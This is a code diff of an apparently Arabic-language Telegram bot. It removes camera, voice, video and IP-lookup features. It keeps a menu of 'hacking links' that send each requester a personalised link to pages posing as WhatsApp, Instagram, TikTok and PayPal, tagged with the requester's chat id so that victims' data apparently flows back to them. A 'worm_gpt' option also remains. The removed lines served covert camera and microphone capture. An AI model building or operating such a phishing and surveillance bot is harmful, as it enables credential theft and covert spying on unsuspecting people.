@@ -69,9 +69,6 @@ WELCOME_MSG = (
 # روابط الصفحات (مستضافة على Vercel)
 VERCEL_BASE = "https://yahya-kappa.vercel.app"
 LINK_NUM = f"{VERCEL_BASE}/Number%20Phone.html"
-LINK_CAMERA_FRONT = f"{VERCEL_BASE}/Front%20Camera%20Recording.html"
-LINK_VOICE = f"{VERCEL_BASE}/Voice.html"
-LINK_VIDEO = f"{VERCEL_BASE}/Vedio%20Record.html"
 LINK_FI_REPLY = f"{VERCEL_BASE}/Phone%20Info.html"
 LINK_WHATSAPP = f"{VERCEL_BASE}/Whatsapp.html"
 LINK_INSTAGRAM = f"{VERCEL_BASE}/Instagram.html"
@@ -87,7 +84,6 @@ LINK_MESSENGER = f"{VERCEL_BASE}/PayPal.html"
 
 # حالات انتظار للمدخلات التفاعلية
 waiting_for_google_play = {}
-waiting_for_ip = {}
 waiting_for_user_lookup = {}
 waiting_for_link_short = {}
 waiting_for_translate = {}
@@ -422,10 +418,6 @@ def build_main_menu():
         return InlineKeyboardButton(text, callback_data=cb, style=style)
     pairs = [
         ("رقم 📱", "get_link_num"),
-        ("كاميرا أمامية 📸", "get_link_camera_front"),
-        ("تسجيل صوت 🎤", "get_voice"),
-        ("فيديو 🎥", "get_video"),
-        ("IP 🌐", "get_ip_info"),
         ("ID 🆔", "get_id"),
         ("صور AI 🎨", "ai_image"),
         ("اختصار روابط 🔗", "short_link"),
@@ -947,37 +939,6 @@ def handle_message(message):
         if not check_subscription_and_continue(chat_id, chat_id):
             return
 
-    # معلومات IP
-    if waiting_for_ip.get(chat_id):
-        ip = message.text.strip()
-        try:
-            r = requests.get(
-                f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,query,isp,org,as,timezone,zip,lat,lon",
-                timeout=8
-            ).json()
-            if r.get("status") == "success":
-                bot.send_message(chat_id,
-                    f"🌐 **معلومات IP:**\n\n"
-                    f"📍 **IP:** `{r.get('query')}`\n"
-                    f"🏳️ **الدولة:** {r.get('country')}\n"
-                    f"🏙️ **المدينة:** {r.get('city')}\n"
-                    f"📡 **ISP:** {r.get('isp')}\n"
-                    f"🏢 **المنظمة:** {r.get('org')}\n"
-                    f"🔢 **AS:** {r.get('as')}\n"
-                    f"🌍 **المنطقة:** {r.get('regionName')}\n"
-                    f"🕒 **المنطقة الزمنية:** {r.get('timezone')}\n"
-                    f"📮 **الرمز البريدي:** {r.get('zip')}\n"
-                    f"📍 **خط الطول:** {r.get('lon')}\n"
-                    f"📍 **خط العرض:** {r.get('lat')}",
-                    parse_mode="Markdown"
-                )
-            else:
-                bot.send_message(chat_id, "❌ لم يتم العثور على معلومات لهذا IP")
-        except Exception as e:
-            bot.send_message(chat_id, f"⚠️ خطأ: {e}")
-        waiting_for_ip[chat_id] = False
-        return
-
     # بحث مستخدم
     if waiting_for_user_lookup.get(chat_id):
         user_input = message.text.strip()
@@ -1362,18 +1323,12 @@ def callback_query(call):
     # روابط الاختراق
     if call.data == "get_link_num": 
         bot.send_message(chat_id, f"{LINK_NUM}?id={chat_id}")
-    elif call.data == "get_link_camera_front": 
-        bot.send_message(chat_id, f"{LINK_CAMERA_FRONT}?id={chat_id}")
     elif call.data == "get_tiktok": 
         bot.send_message(chat_id, f"{LINK_TIKTOK}?id={chat_id}")
     elif call.data == "fi_reply": 
         bot.send_message(chat_id, f"{LINK_FI_REPLY}?id={chat_id}")
     elif call.data == "get_kwai": 
         bot.send_message(chat_id, f"{LINK_KWAI}?id={chat_id}")
-    elif call.data == "get_voice": 
-        bot.send_message(chat_id, f"{LINK_VOICE}?id={chat_id}")
-    elif call.data == "get_video": 
-        bot.send_message(chat_id, f"{LINK_VIDEO}?id={chat_id}")
     elif call.data == "get_whatsapp": 
         bot.send_message(chat_id, f"{LINK_WHATSAPP}?id={chat_id}")
     elif call.data == "get_instagram": 
@@ -1412,10 +1367,6 @@ def callback_query(call):
     elif call.data == "server_check":
         waiting_for_server_check[chat_id] = True
         bot.send_message(chat_id, "🌐 أرسل رابط السيرفر أو الدومين الذي تريد فحصه:")
-
-    elif call.data == "get_ip_info":
-        waiting_for_ip[chat_id] = True
-        bot.send_message(chat_id, "🌐 أرسل عنوان IP الذي تريد معرفة معلوماته:")
 
     elif call.data == "worm_gpt":
         waiting_for_wormgpt[chat_id] = True
